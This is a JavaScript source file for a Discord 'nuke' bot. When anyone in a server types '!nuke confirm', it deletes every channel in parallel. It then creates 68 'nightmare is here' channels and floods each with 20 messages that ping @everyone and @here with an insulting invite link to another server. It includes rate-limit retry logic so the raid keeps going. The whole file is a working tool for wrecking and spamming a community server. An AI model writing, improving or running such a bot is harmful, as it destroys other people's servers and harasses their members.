const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error("❌ NO TOKEN. Set TOKEN in Railway environment variables.");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

// Fancy "nightmare is here" variants
const channelNames = [
  "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
  "𝗻𝗶𝗴𝗵𝘁𝗺𝗮𝗿𝗲 𝗶𝘀 𝗵𝗲𝗿𝗲",
  "𝙣𝙞𝙜𝙝𝙩𝙢𝙖𝙧𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚",
  "n̶i̶g̶h̶t̶m̶a̶r̶e̶ i̶s̶ h̶e̶r̶e̶",
  "n̷i̷g̷h̷t̷m̷a̷r̷e̷ i̷s̷ h̷e̷r̷e̷"
];

const spamMsg = `# lipat server mga tanga! __https://discord.gg/fccuzDHAA__ ||@everyone|| ||@here||`;

async function runParallel(tasks, concurrency) {
  const results = [];
  const executing = [];
  for (const task of tasks) {
    const p = Promise.resolve().then(() => task());
    results.push(p);
    if (concurrency <= tasks.length) {
      const e = p.then(() => executing.splice(executing.indexOf(e), 1));
      executing.push(e);
      if (executing.length >= concurrency) {
        await Promise.race(executing);
      }
    }
  }
  return Promise.allSettled(results);
}

// DELETE ALL CHANNELS - CONCURRENCY 15 (MAXIMUM)
async function deleteAllChannels(guild) {
  const channels = [...guild.channels.cache.values()];
  console.log(`🗑️ DELETING ${channels.length} CHANNELS AT CONCURRENCY 15...`);
  const tasks = channels.map(chan => async () => {
    try {
      await chan.delete();
      console.log(`✅ Deleted ${chan.name}`);
    } catch (e) {}
  });
  await runParallel(tasks, 15);
  console.log(`✅ ALL CHANNELS DELETED`);
}

// CREATE 68 CHANNELS AND SPAM 20 MESSAGES IN EACH - MAX SPEED
async function create68ChannelsAndSpam(guild) {
  console.log(`🚀 CREATING 68 CHANNELS AT CONCURRENCY 10...`);
  const createTasks = [];
  for (let i = 1; i <= 68; i++) {
    const randomName = channelNames[Math.floor(Math.random() * channelNames.length)];
    const channelName = `${randomName}-${i}`;
    createTasks.push(async () => {
      try {
        const channel = await guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          permissionOverwrites: [{
            id: guild.roles.everyone.id,
            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
          }]
        });
        console.log(`📝 Created #${channelName}`);
        
        // SEND 20 MESSAGES IN PARALLEL (ALL AT ONCE)
        const msgPromises = [];
        for (let j = 0; j < 20; j++) {
          msgPromises.push(channel.send(spamMsg).catch(async (err) => {
            if (err.code === 429) {
              console.log(`⏳ Rate limit, retrying message in ${channelName}`);
              await new Promise(r => setTimeout(r, err.retryAfter * 1000));
              return channel.send(spamMsg);
            }
            return null;
          }));
        }
        await Promise.all(msgPromises);
        console.log(`💬 20 MESSAGES SENT IN #${channelName}`);
      } catch (err) {
        if (err.code === 429) {
          console.log(`⏳ Rate limit on create, waiting ${err.retryAfter}s`);
          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
          // retry creation (simplified - will be handled by outer loop? actually task fails, but we just log)
          console.log(`Retry creation for ${channelName} not implemented in this burst mode`);
        } else {
          console.log(`❌ Create fail ${channelName}: ${err.message}`);
        }
      }
    });
  }
  await runParallel(createTasks, 10); // 10 channels at a time
  console.log(`✅ ALL 68 CHANNELS CREATED AND SPAMMED`);
}

async function nukeGuild(guild) {
  console.log(`🔥🔥🔥 QUANTUM NUKE ON ${guild.name} 🔥🔥🔥`);
  await deleteAllChannels(guild);
  await create68ChannelsAndSpam(guild);
  console.log("💀 QUANTUM NUKE COMPLETE 💀");
}

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  client.user.setPresence({
    status: 'dnd',
    activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }]
  });
  console.log("✅ STATUS: DND | @azairo");
});

client.on('messageCreate', async (msg) => {
  if (msg.author.bot || !msg.content.startsWith('!')) return;
  const args = msg.content.slice(1).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  if (cmd === 'nuke') {
    if (args[0] !== 'confirm') {
      return msg.reply("⚠️ Type `!nuke confirm` to INSTANTLY NUKE THE SERVER.");
    }
    await msg.reply("💣 QUANTUM NUKE ACTIVATED. DELETING EVERYTHING...");
    await nukeGuild(msg.guild);
  }
});

client.login(TOKEN).catch(err => console.error("❌ Login failed:", err.message));
